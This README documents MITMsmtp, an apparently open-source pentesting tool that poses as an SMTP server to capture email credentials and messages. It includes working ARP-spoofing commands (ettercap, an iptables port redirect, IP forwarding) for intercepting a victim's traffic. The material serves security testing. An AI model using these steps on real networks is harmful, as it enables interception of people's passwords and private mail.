# MITMsmtp
MITMsmtp is an Evil SMTP Server for pentesting SMTP clients to catch login credentials and mails sent over plain or SSL/TLS encrypted connections. The idea is to catch sensitive emails sent by clients which are not correctly verifying the SMTP servers identity in SSL/TLS mode. MITMsmtp will catch username and password as well as the message itself. This way you might gain access to a companies mail server or catch information like password reset tokens or verification links sent by applications. Using those information you might gain more and more access to a system. MITMsmtp has been built to work together with MITM Attacks like ARP Spoofing to terminate encrypted connections. MITMsmtp could be used as a honeypot as well.

MITMsmtp offers a command line tool as well as an open Python3 API which can be used to build own tools for automated pentesting of applications.

## Compatibility
MITMsmtp has been tested against the SMTP client of Thunderbird 60.5.3 and some other SMTP clients.

### Connection Security
MITMsmtp supports the following connection security modes:
* Plaintext
* STARTTLS
* SSL/TLS

### Login Methods
MITMsmtp supports the following login methods:
* PLAIN
* LOGIN

Challenge-Response based authentication methods like CRAM-MD5, NTLM or Kerberos can't be supported as these methods require the server to know the cleartext password.

## Setup
MITMsmtp requires Python3 and setuptools. You might want to install git as well. Use the following command on Debian:

`apt install python3 python3-setuptools git`

Now just clone the MITMsmtp repository:

`git clone https://github.com/RobinMeis/MITMsmtp.git`

Change into MITMsmtp directory and start the installation:

`sudo python3 setup.py install`

That's it!

### Updating
`git pull`

`sudo python3 setup.py install`

## Usage
*MITMsmtp can be used as standalone command line application and offers an easy to use Python3 API to integrate in your own project*

### Command Line
Running `MITMsmtp --help` will give you an overview about the available command line switches:
```
usage: MITMsmtp [-h] [--server_address SERVER_ADDRESS] [--port PORT]
                [--server_name SERVER_NAME] [--STARTTLS] [--SSL]
                [--certfile CERTFILE] [--keyfile KEYFILE] [--log LOG]
                [--disable-auth-plain] [--disable-auth-login] [--print-lines]

MITMsmtp is an Evil SMTP Server for pentesting SMTP clients to catch login
credentials and mails sent over plain or SSL encrypted connections.

optional arguments:
  -h, --help            show this help message and exit
  --server_address SERVER_ADDRESS
                        IP Address to listen on (default: all)
  --port PORT           Port to listen on (default: 8587)
  --server_name SERVER_NAME
                        FQDN of Server (default: smtp.example.com)
  --STARTTLS            Enables and requires STARTTLS Support (default: False)
  --SSL                 Enables SSL Support (default: False)
  --certfile CERTFILE   Certfificate for SSL Mode (default: Default MITMsmtp
                        Certificate)
  --keyfile KEYFILE     Key for SSL Mode (default: Default MITMsmtp Keyfile)
  --log LOG             Directory for mails and credentials
  --disable-auth-plain  Disables authentication using method PLAIN (default:
                        False)
  --disable-auth-login  Disables authentication using method LOGIN (default:
                        False)
  --print-lines         Prints communication between Client and MITMsmtp
                        (default: False)
```

When running `MITMsmtp` without any parameters it will start an unencrypted SMTP server on port 8587 on all interfaces. Pointing Thunderbird or any other SMTP client will give you the ability to test MITMsmtp. Please keep in mind that the default port MITMsmtp differs from the SMTP default port.

As soon as a client has logged in, you will get the following information:

```
=== Login ===
Username: user@example.com
Password: SuperSecureAndUncrackablePassword
```

After the client has transmitted it's message, you will get basic information about the message:

```
=== Complete Message ===
Username  : user@example.com
Password  : SuperSecureAndUncrackablePassword
Client    : [192.168.178.42]
Sender    : user@example.com
Recipients: recipient-a@example.com
            recipient-b@example.com
```

If you want to get the full message, you have to enable logging.

### Logging
Running `MITMsmtp --log logdir` will enable logging. Please make sure that the directory exists. MITMsmtp will create n+1 files while n is the amount of received messages. Each mail will be written into a new file like it has been received. Additionally all received credentials are stored in `credentials.log`.

### Encryption
Some clients fallback to unencrypted mode if you don't offer SSL/TLS. Always make sure to test this! For clients which don't fallback, you may want to test the encrypted mode. Please keep in mind, that a correctly configured client won't be vulnerable to this attack. You will be unable to fake a trusted certificate for a validated common name and thus the client will stop connection before sending credentials. However some clients don't implement proper certificate validation. This is where this attack starts.

#### STARTTLS
STARTTLS is available for MTIMsmtp. When enabled it will enforce STARTTLS.

To use MITMsmtp with the example certificates run `MITMsmtp --STARTTLS`.

#### SSL/TLS
To run MITMsmtp in SSL mode you need a certificate and the according key. You can use the example in certs/. For some clients you might need to generate own certificates to bypass certain validation steps.

To use MITMsmtp with the example certificates run `MITMsmtp --SSL`.

### API
For an example you might want to consult `MITMsmtp/__main__.py`. More docs will be available soon!

## MITM
This section shows the usage of MITMsmtp if you are able to intercept the victims traffic.

### ARP Spoofing
ARP Spoofing is one way to get between Victim and Router. In case you have the ability to modify your routers settings, you might skip this step. There are many other ways to perform MITM Attacks like DHCP Race-Conditions or DNS Spoofing. These instructions are just a basic idea how to use MITMsmtp. First of all you need the victims and the routers IP address. Make also sure that your client is connected to the same subnet.

In this example the Routers IP will be *192.168.42.1* and the Victims IP will be *192.168.42.24*. Run the following commands as root.

First of all we are going to enable forwarding mode:

`sysctl -w net.ipv4.ip_forward=1`

To make sure that out victim doesn't find a way around us, block ICMP redirects:

`sysctl -w net.ipv4.conf.all.send_redirects=0`

Next we create a port forwarding rule from SMTP default port 587 to MITMsmtp. Please make sure that your victim uses port 587 and adjust if needed.

`iptables -t nat -A PREROUTING -p tcp --destination-port 587 -j REDIRECT --to-port 8587`

To start ARP Spoofing you will need ettercap. Run the following command and replace the IP addresses according to your setup:

`ettercap -T -M arp /192.168.42.24/ /192.168.42.1/`

Finally you can fire up MITMsmtp:

`MITMsmtp --log log/`

#### Limitations
As we perform a port forward, MITMsmtp can't determine the original packet destination. This means that MITMsmtp can't log the real SMTP server name or IP. If you need these information, just run wireshark while catching mails using MITMsmtp and filter for `tcp.port==587` or `dns`. This way you will be able to get the domain name as well as the original IP.

## Reference
[1] https://tools.ietf.org/html/rfc5321

[2] http://www.samlogic.net/articles/smtp-commands-reference-auth.htm

[3] https://tools.ietf.org/html/rfc3207
